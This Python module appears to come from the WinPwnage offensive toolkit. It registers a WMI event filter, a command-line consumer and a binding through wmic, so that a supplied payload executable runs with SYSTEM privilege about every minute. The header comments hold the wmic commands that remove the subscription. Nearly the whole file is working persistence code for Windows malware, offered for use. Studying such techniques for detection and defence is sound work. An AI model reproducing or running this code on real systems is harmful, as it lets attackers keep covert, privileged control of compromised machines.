import os
import time
from core.prints import *
from core.utils import *

#wmic /namespace:"\\root\subscription" PATH __EventFilter WHERE Name="WinPwnageFilter" DELETE
#wmic /namespace:"\\root\subscription" PATH CommandLineEventConsumer WHERE Name="WinPwnageConsumer" DELETE
#wmic /namespace:"\\root\subscription" PATH __FilterToConsumerBinding WHERE Filter='__EventFilter.Name="WinPwnageFilter"' DELETE	

wmic_info = {
        "Description": "Gain persistence with system privilege using wmic",
		"Id" : "22",
		"Type" : "Persistence",	
		"Fixed In" : "99999",
		"Works From" : "7600",
		"Admin" : True,
		"Function Name" : "persist_wmic",
		"Function Payload" : True,
    }
	
def persist_wmic(payload):
	if (payloads().exe(payload) == True):
		if (information().admin() == True):
			if (process().create("wmic /namespace:'\\\\root\\subscription' PATH __EventFilter CREATE Name='WinPwnageFilter', EventNameSpace='root\\cimv2',QueryLanguage='WQL', Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System''",0) == True):
				print_success("WinPwnageFilter done")
			else:
				print False
			time.sleep(3)
			if (process().create("wmic /namespace:'\\\\root\\subscription' PATH CommandLineEventConsumer CREATE Name='WinPwnageConsumer', ExecutablePath='{}',CommandLineTemplate='{}'".format(os.path.join(payload),os.path.join(payload)),0) == True):
				print True
			else:
				print False	
			time.sleep(3)
			if (process().create("wmic /namespace:'\\\\root\\subscription' PATH __FilterToConsumerBinding CREATE Filter='__EventFilter.Name='WinPwnageFilter'', Consumer='CommandLineEventConsumer.Name='WinPwnageConsumer''",0) == True):
				print True
			else:
				print False
		else:
			print_error("Unable to proceed, we are not elevated")
	else:
		print_error("Cannot proceed, invalid payload")
		return False				